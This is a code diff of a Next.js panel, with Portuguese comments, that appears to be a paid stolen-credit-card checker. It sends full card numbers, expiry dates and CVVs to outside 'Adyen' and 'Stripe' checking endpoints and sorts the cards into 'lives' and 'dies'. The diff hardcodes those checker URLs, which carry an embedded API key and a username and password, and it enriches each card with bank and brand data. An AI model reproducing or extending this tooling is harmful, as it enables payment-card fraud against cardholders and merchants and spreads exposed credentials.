@@ -36,15 +36,17 @@ import useTranslation from 'next-translate/useTranslation';
 // Constantes para os checkers
 const CHECKER_CONFIG = {
   adyen: {
-    liveCost: 0.20, // $0.20 por live
-    apiUrl: process.env.API_1_URL,
+    liveCost: 0.20,
+    dieCost: 0,
+    maxDies: 40,
+    apiUrl: 'https://adyen-api.vercel.app/api/adyen?adyenKey=6e0a949a-44bd-4959-86f5-76dfeea86ba2&cc=',
     name: 'Adyen Gateway'
   },
   premium: {
-    liveCost: 1.00, // $1.00 por live
-    dieCost: 0.10, // $0.10 por die
-    maxConsecutiveDies: 20,
-    apiUrl: process.env.API_2_URL,
+    liveCost: 1.00,
+    dieCost: 0.10,
+    maxDies: 20,
+    apiUrl: 'https://azkabancenter.store/azkabandev.php?usuario=v3non&senha=hardkill]]&testador=2-preauth&lista=',
     name: 'Premium Stripe Gateway'
   }
 };
@@ -52,43 +54,17 @@ const CHECKER_CONFIG = {
 // Função para obter informações do BIN
 const getBinInfo = async (bin) => {
   try {
-    const res = await axios.get(`https://lookup.binlist.net/${bin}`, {
-      headers: {
-        'Accept-Version': '3',
-        'Accept': 'application/json'
-      }
-    });
-
-    // Mapeamento de bandeiras
-    const brandMap = {
-      'visa': 'VISA',
-      'mastercard': 'MASTERCARD',
-      'american express': 'AMEX',
-      'discover': 'DISCOVER',
-      'jcb': 'JCB',
-      'diners club': 'DINERS'
-    };
-
-    // Mapeamento de tipos
-    const typeMap = {
-      'credit': 'CREDIT',
-      'debit': 'DEBIT',
-      'prepaid': 'PREPAID'
-    };
-
+    const res = await axios.get(`https://lookup.binlist.net/${bin}`);
     return {
-      bank: res.data.bank?.name || res.data.bank?.organization || 'Unknown Bank',
-      type: typeMap[res.data.type?.toLowerCase()] || res.data.type?.toUpperCase() || 'Unknown Type',
-      brand: brandMap[res.data.scheme?.toLowerCase()] || res.data.scheme?.toUpperCase() || 'Unknown Brand',
-      country: res.data.country?.name || res.data.country?.emoji || 'Unknown Country',
+      bank: res.data.bank?.name || 'Unknown Bank',
+      type: res.data.type?.toUpperCase() || 'Unknown Type',
+      brand: res.data.scheme?.toUpperCase() || 'Unknown Brand',
+      country: res.data.country?.name || 'Unknown Country',
       level: res.data.brand?.toLowerCase().includes('platinum') ? 'PLATINUM' : 
              res.data.brand?.toLowerCase().includes('business') ? 'BUSINESS' : 
              res.data.brand?.toLowerCase().includes('corporate') ? 'CORPORATE' : 'CLASSIC'
     };
   } catch (error) {
-    console.error('BIN lookup error:', error);
-    
-    // Identificação básica pela numeração
     const firstDigit = bin?.charAt(0);
     let basicInfo = {
       bank: 'Unknown Bank',
@@ -98,15 +74,10 @@ const getBinInfo = async (bin) => {
       level: 'CLASSIC'
     };
 
-    if (firstDigit === '4') {
-      basicInfo.brand = 'VISA';
-    } else if (firstDigit === '5') {
-      basicInfo.brand = 'MASTERCARD';
-    } else if (firstDigit === '3') {
-      basicInfo.brand = ['4','7'].includes(bin?.charAt(1)) ? 'AMEX' : 'JCB';
-    } else if (firstDigit === '6') {
-      basicInfo.brand = 'DISCOVER';
-    }
+    if (firstDigit === '4') basicInfo.brand = 'VISA';
+    else if (firstDigit === '5') basicInfo.brand = 'MASTERCARD';
+    else if (firstDigit === '3') basicInfo.brand = ['4','7'].includes(bin?.charAt(1)) ? 'AMEX' : 'JCB';
+    else if (firstDigit === '6') basicInfo.brand = 'DISCOVER';
 
     return basicInfo;
   }
@@ -305,17 +276,22 @@ export default function Painel() {
           const cardData = formatCard(cc);
           const binInfo = await getBinInfo(cardData.bin);
 
-          const checkUrl = `${process.env.API_1_URL}${cardData.number}|${cardData.month}|${cardData.year}|${cardData.cvv}`;
-          
-          const check = await axios.get(checkUrl, {
-            headers: { token: window.localStorage.getItem('token') }
-          });
+          const check = await axios.get(CHECKER_CONFIG.adyen.apiUrl + cc);
 
-          const result = processAdyenResponse({
-            cc,
-            ...check.data,
-            binInfo
-          }, binInfo);
+          const result = {
+            card: cc,
+            binInfo,
+            message: check.data.retorno,
+            success: check.data.success && check.data.retorno.includes('Pagamento Aprovado'),
+            details: {
+              number: cardData.number,
+              brand: binInfo.brand,
+              type: binInfo.type,
+              bank: binInfo.bank,
+              country: binInfo.country,
+              level: binInfo.level
+            }
+          };
 
           if (result.success) {
             setLives(old => [result, ...old]);
@@ -370,17 +346,22 @@ export default function Painel() {
           const cardData = formatCard(cc);
           const binInfo = await getBinInfo(cardData.bin);
 
-          const checkUrl = `${process.env.API_2_URL}${cardData.number}|${cardData.month}|${cardData.year}|${cardData.cvv}`;
-          
-          const check = await axios.get(checkUrl, {
-            headers: { token: window.localStorage.getItem('token') }
-          });
+          const check = await axios.get(CHECKER_CONFIG.premium.apiUrl + cc);
 
-          const result = processPremiumResponse({
-            cc,
-            ...check.data,
-            binInfo
-          }, binInfo);
+          const result = {
+            card: cc,
+            binInfo,
+            message: check.data.retorno,
+            success: check.data.success && check.data.retorno.includes('Pagamento Aprovado'),
+            details: {
+              number: cardData.number,
+              brand: binInfo.brand,
+              type: binInfo.type,
+              bank: binInfo.bank,
+              country: binInfo.country,
+              level: binInfo.level
+            }
+          };
 
           if (result.success) {
             setConsecutiveDies(0);
@@ -388,7 +369,7 @@ export default function Painel() {
           } else {
             setConsecutiveDies(prev => {
               const newCount = prev + 1;
-              if (newCount >= CHECKER_CONFIG.premium.maxConsecutiveDies) {
+              if (newCount >= CHECKER_CONFIG.premium.maxDies) {
                 alerts.fire({
                   icon: 'error',
                   title: 'Account Restricted',
@@ -861,7 +842,7 @@ export default function Painel() {
                 marginTop: '10px',
                 fontSize: '12px'
               }}>
-                ⚠️ Account will be restricted after {CHECKER_CONFIG.premium.maxConsecutiveDies} consecutive failed checks
+                ⚠️ Account will be restricted after {CHECKER_CONFIG.premium.maxDies} consecutive failed checks
               </small>
             </div>
           </div>
